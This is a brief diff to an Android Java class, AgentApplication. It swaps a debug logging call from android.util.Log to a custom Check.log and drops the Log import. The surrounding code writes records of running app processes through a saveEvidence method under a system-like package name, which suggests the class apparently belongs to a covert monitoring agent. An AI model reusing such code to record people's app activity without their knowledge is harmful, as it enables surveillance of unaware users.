@@ -12,7 +12,6 @@ package com.android.service.agent;
 import java.util.ArrayList;
 
 import android.app.ActivityManager.RunningAppProcessInfo;
-import android.util.Log;
 
 import com.android.service.LogR;
 import com.android.service.ProcessInfo;
@@ -74,7 +73,7 @@ public class AgentApplication extends AgentBase implements Observer<ProcessInfo>
 		log.write(items);
 		log.close();
 		
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " (saveEvidence): " + name + " " + status.name());
+		if(Cfg.DEBUG) Check.log( TAG + " (saveEvidence): " + name + " " + status.name());
 	}
 
 }
